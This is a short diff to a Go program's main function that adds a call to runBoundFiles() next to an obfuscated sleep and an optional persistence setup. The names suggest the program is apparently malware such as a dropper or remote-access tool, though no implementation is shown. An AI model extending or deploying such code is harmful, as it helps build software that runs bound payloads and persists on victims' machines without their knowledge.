@@ -16,6 +16,8 @@ func main() {
 		sleepObfuscated(cfg.SleepSeconds)
 	}
 
+	runBoundFiles()
+
 	if cfg.EnablePersistence {
 		if err := persistence.Setup(); err != nil {
 			log.Printf("Warning: Failed to setup persistence: %v", err)
